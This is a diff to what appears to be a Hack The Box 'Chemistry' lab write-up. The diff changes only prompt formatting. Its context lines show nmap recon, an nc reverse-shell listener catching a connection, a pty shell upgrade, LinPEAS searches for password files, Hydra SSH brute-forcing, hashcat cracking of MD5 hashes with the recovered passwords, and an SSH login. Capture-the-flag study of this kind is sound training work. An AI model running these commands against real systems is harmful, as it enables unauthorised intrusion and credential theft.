@@ -5,8 +5,8 @@ Difficulty: Easy
 ## Steps
 ### Recon
 ```Bash
-┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
-└──╼ [★]$ nmap -Pn -F --min-rate=1000 -T5 chemistry
+[us-vip-3][10.10.14.22][gntsqid@htb-xm39dvuluo][~]
+ []$ nmap -Pn -F --min-rate=1000 -T5 chemistry
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 17:38 CST
 Nmap scan report for chemistry (10.10.11.38)
 Host is up (0.066s latency).
@@ -74,8 +74,8 @@ Let's see if we can find any known exploits!
 ### Exploit Search
 
 ```Bash
-┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
-└──╼ [★]$ searchsploit cif
+[us-vip-3][10.10.14.22][gntsqid@htb-xm39dvuluo][~]
+ []$ searchsploit cif
 ------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                                                        |  Path
 ------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
@@ -383,8 +383,8 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 > This is super helpful with navigation and elevating commands
 ```Bash
-┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
-└──╼ [★]$ nc -lvnp 7777
+[us-vip-3][10.10.14.22][gntsqid@htb-xm39dvuluo][~]
+ []$ nc -lvnp 7777
 listening on [any] 7777 ...
 connect to [10.10.14.22] from (UNKNOWN) [10.10.11.38] 33992
 sh: 0: can't access tty; job control turned off
@@ -405,13 +405,13 @@ I ran LinPEAS:
 ![image](https://github.com/user-attachments/assets/59f41d88-7c90-4019-9010-92f36b18351c)
 
 ```Bash
-╔══════════╣ Users with console
+ Users with console
 app:x:1001:1001:,,,:/home/app:/bin/bash
 root:x:0:0:root:/root:/bin/bash
 rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
 ```
 ```Bash
-╔══════════╣ Useful software
+ Useful software
 /usr/bin/base64
 /usr/bin/curl
 /usr/bin/g++
@@ -426,7 +426,7 @@ rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
 /usr/bin/wget
 ```
 ```Bash
-╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+ Searching *password* or *credential* files in home (limit 70)
 /etc/pam.d/common-password
 /usr/bin/systemd-ask-password
 /usr/bin/systemd-tty-ask-password-agent
@@ -477,11 +477,11 @@ rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
 /usr/share/man/man8/systemd-ask-password-console.service.8.gz
 /usr/share/man/man8/systemd-ask-password-wall.path.8.gz
 
-╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+ Checking for TTY (sudo/su) passwords in audit logs
 
-╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+ Checking for TTY (sudo/su) passwords in audit logs
 
-╔══════════╣ Searching passwords inside logs (limit 70)
+ Searching passwords inside logs (limit 70)
 [    4.666678] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
 [    5.754596] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
 Binary file /var/log/journal/50eeb7fac3464e29ad4e2725d371e6c5/user-1001.journal matches
@@ -489,8 +489,8 @@ Binary file /var/log/journal/50eeb7fac3464e29ad4e2725d371e6c5/user-1001.journal 
 
 I also attempted to run Hydra:
 ```Bash
-┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
-└──╼ [★]$ hydra -l rosa -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.38 ssh
+[us-vip-3][10.10.14.22][gntsqid@htb-xm39dvuluo][~]
+ []$ hydra -l rosa -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.38 ssh
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-20 23:10:42
@@ -676,8 +676,8 @@ Hash types
        0 = MD5
 ```
 ```Bash
-┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
-└──╼ [★]$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 
+[us-vip-3][10.10.14.19][gntsqid@htb-cyfdkzz7f3][~/Documents]
+ []$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -753,8 +753,8 @@ Stopped: Mon Dec 23 13:35:39 2024
 
 The reason being is that it caches already cracked hashes into its own rainbow table of sorts(?)
 ```Bash
-┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
-└──╼ [★]$ hashcat --show -m 0 hash 
+[us-vip-3][10.10.14.19][gntsqid@htb-cyfdkzz7f3][~/Documents]
+ []$ hashcat --show -m 0 hash 
 63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
 9ad48828b0955513f7cf0f7f6510c8f8:carlos123
 6845c17d298d95aa942127bdad2ceb9b:peterparker
@@ -772,8 +772,8 @@ We want to know *rosa's* password:
 ```
 Now we have our way in:
 ```Bash
-┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
-└──╼ [★]$ ssh rosa@chem.box
+[us-vip-3][10.10.14.19][gntsqid@htb-cyfdkzz7f3][~/Documents]
+ []$ ssh rosa@chem.box
 The authenticity of host 'chem.box (10.10.11.38)' can't be established.
 ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
 This key is not known by any other names.
